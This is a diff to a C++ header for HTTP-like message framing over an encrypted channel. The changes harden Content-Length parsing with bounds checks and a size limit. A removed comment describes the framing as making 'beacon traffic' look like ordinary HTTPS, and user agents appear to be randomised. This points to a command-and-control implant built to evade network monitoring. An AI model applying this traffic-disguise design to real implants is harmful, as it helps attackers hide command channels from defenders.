@@ -1,5 +1,5 @@
-// HTTP mimicry framing over TLS (header-only) - beacon traffic looks like
-// ordinary HTTPS web traffic. Tokens are randomized per request.
+// HTTP-like framing over an encrypted TCP channel (header-only). This is a
+// lab protocol, not an HTTP/TLS implementation.
 #pragma once
 #include "kx.h"
 #include <string>
@@ -20,7 +20,8 @@ static const char* http_pick_ua() {
 
 static bool http_read_body(SecureChannel& t, std::string& body) {
     std::string hdr;
-    while (hdr.find("\r\n\r\n") == std::string::npos) {
+    size_t header_end = std::string::npos;
+    while ((header_end = hdr.find("\r\n\r\n")) == std::string::npos) {
         char tmp[1024];
         int n = t.recv(tmp, sizeof(tmp));
         if (n <= 0) return false;
@@ -31,14 +32,17 @@ static bool http_read_body(SecureChannel& t, std::string& body) {
     size_t pos = hdr.find("Content-Length:");
     if (pos == std::string::npos) return false;
     pos += 15;
-    while (hdr[pos] == ' ') pos++;
+    while (pos < header_end && hdr[pos] == ' ') pos++;
     size_t end = hdr.find("\r\n", pos);
-    int len = atoi(hdr.substr(pos, end - pos).c_str());
-    if (len < 0 || len > (1 << 22)) return false;
+    if (end == std::string::npos || end > header_end || pos == end) return false;
+    char* parsed_end = nullptr;
+    unsigned long parsed = strtoul(hdr.c_str() + pos, &parsed_end, 10);
+    if (parsed_end != hdr.c_str() + end || parsed > (1UL << 22)) return false;
+    size_t len = (size_t)parsed;
 
-    size_t body_start = hdr.find("\r\n\r\n") + 4;
+    size_t body_start = header_end + 4;
     body = hdr.substr(body_start);
-    while ((int)body.size() < len) {
+    while (body.size() < len) {
         char tmp[2048];
         int n = t.recv(tmp, sizeof(tmp));
         if (n <= 0) return false;
